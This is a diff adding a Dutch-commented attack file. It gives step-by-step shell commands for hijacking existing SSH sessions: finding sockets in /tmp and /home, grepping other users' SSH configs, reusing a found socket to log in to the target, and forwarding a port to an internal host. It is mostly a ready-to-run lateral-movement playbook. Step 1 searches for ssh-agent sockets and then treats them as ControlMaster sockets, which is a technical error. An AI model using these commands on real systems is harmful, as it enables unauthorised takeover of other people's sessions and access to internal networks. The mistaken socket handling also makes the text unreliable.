@@ -1,0 +1,16 @@
+# SSH ControlMaster Hijacking - Bestaande SSH sessies overnemen
+# Stap 1: Zoek actieve SSH ControlMaster sockets
+find /tmp -path '*/ssh-*' -name 'agent.*' 2>/dev/null
+ls -la /tmp/ssh-*/
+# Check ook in home directories:
+find /home -name 'control-*' -o -name '*.sock' 2>/dev/null
+# Stap 2: Zoek SSH config voor ControlMaster instellingen
+grep -r "ControlMaster\|ControlPath\|ControlPersist" /home/*/.ssh/config 2>/dev/null
+# Stap 3: Gebruik bestaande socket (als root of zelfde user)
+ssh -S /tmp/ssh-XXXX/agent.12345 -O check user@target
+# Als socket actief: maak nieuwe sessie via bestaande multiplexer
+ssh -S /tmp/ssh-XXXX/agent.12345 user@target
+# Stap 4: Forward commando via socket
+ssh -S /tmp/ssh-XXXX/agent.12345 -O forward -L 8080:internal:80 user@target
+# Tip: ControlMaster sockets zijn alleen bruikbaar als root of eigenaar
+# Tip: ControlPersist sockets blijven open na sessie-einde
